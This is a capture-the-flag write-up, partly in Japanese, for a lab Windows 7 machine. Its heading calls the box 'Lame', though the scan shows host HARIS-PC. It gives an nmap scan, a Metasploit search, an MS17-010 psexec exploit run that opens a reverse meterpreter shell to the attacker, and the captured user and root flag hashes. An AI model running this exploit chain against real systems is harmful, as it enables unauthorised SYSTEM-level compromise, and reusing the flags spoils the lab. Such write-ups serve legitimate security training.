# How to solove ?

## add Lame to /etc/hosts
sudo vim /etc/hosts

## scan on nmap 
`nmap -sC -sV -sT -Pn  10.10.10.40`  

<details><summary>nmap 実行結果</summary>   
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-09 17:28 JST
Nmap scan report for 10.10.10.40
Host is up (0.25s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-09T08:34:10
|_  start_date: 2021-02-09T08:25:02

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 442.27 seconds
</details>

###  Summary
PORT    STATE SERVICE     VERSION   
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC

```
msf6 > search smb 2 exploit windows remote

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/admin/smb/ms17_010_command                        2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                   normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
   2   auxiliary/dos/windows/smb/ms11_019_electbowser                               normal     No     Microsoft Windows Browser Pool DoS
   3   exploit/multi/http/struts_code_exec_classloader             2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   4   exploit/multi/ids/snort_dce_rpc                             2007-02-19       good       No     Snort 2 DCE/RPC Preprocessor Buffer Overflow
   5   exploit/windows/browser/java_ws_double_quote                2012-10-16       excellent  No     Sun Java Web Start Double Quote Injection
   6   exploit/windows/fileformat/ms13_071_theme                   2013-09-10       excellent  No     MS13-071 Microsoft Windows Theme File Handling Arbitrary Code Execution
   7   exploit/windows/fileformat/ms14_060_sandworm                2014-10-14       excellent  No     MS14-060 Microsoft Windows OLE Package Manager Code Execution
   8   exploit/windows/misc/hp_dataprotector_cmd_exec              2014-11-02       excellent  Yes    HP Data Protector 8.10 Remote Command Execution
   9   exploit/windows/oracle/extjob                               2007-01-01       excellent  Yes    Oracle Job Scheduler Named Pipe Command Execution
   10  exploit/windows/scada/ge_proficy_cimplicity_gefebt          2014-01-23       excellent  Yes    GE Proficy CIMPLICITY gefebt.exe Remote Code Execution
   11  exploit/windows/smb/group_policy_startup                    2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   12  exploit/windows/smb/ipass_pipe_exec                         2015-01-21       excellent  Yes    IPass Control Pipe Remote Command Execution
   13  exploit/windows/smb/ms06_025_rasmans_reg                    2006-06-13       good       No     MS06-025 Microsoft RRAS Service RASMAN Registry Overflow
   14  exploit/windows/smb/ms06_025_rras                           2006-06-13       average    No     MS06-025 Microsoft RRAS Service Overflow
   15  exploit/windows/smb/ms17_010_eternalblue                    2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   16  exploit/windows/smb/ms17_010_eternalblue_win8               2017-03-14       average    No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   17  exploit/windows/smb/ms17_010_psexec                         2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   18  exploit/windows/smb/smb_doublepulsar_rce                    2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 18, use 18 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 > use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
RHOSTS => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
LHOST => tun0

msf6 exploit(windows/smb/ms17_010_psexec) > show options 

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting                                                              Required  Description
   ----                  ---------------                                                              --------  -----------
   DBGTRACE              false                                                                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                                                                           yes       How many times to try to leak transaction
   NAMEDPIPE                                                                                          no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /opt/metasploit-framework/embedded/framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                10.10.10.40                                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445                                                                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                                                                no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                                                               no        The service display name
   SERVICE_NAME                                                                                       no        The service name
   SHARE                 ADMIN$                                                                       yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                                                                            no        The Windows domain to use for authentication
   SMBPass                                                                                            no        The password for the specified username
   SMBUser                                                                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.11:4444 
[*] 10.10.10.40:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
[*] 10.10.10.40:445 - Built a write-what-where primitive...
[+] 10.10.10.40:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.10.10.40:445 - Selecting PowerShell target
[*] 10.10.10.40:445 - Executing the payload...
[+] 10.10.10.40:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.11:4444 -> 10.10.10.40:49160) at 2021-02-09 18:09:33 +0900


meterpreter > pwd
C:\Windows\system32

meterpreter > cd "C:\Users\Administrator\desktop"
meterpreter > ls
Listing: C:\Users\Administrator\desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-21 15:56:36 +0900  desktop.ini
100444/r--r--r--  32    fil   2017-07-21 15:56:49 +0900  root.txt

meterpreter > type root.txt
[-] Unknown command: type.
meterpreter > cat root.txt
ff548eb71e920ff6c08843ce9df4e717
meterpreter > ls
Listing: C:\Users\haris\desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-14 22:45:52 +0900  desktop.ini
100666/rw-rw-rw-  32    fil   2017-07-21 15:54:02 +0900  user.txt

meterpreter > cat user.tx
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > cat user.txt
4c546aea7dbee75cbd71de245c8deea9
meterpreter > 




```
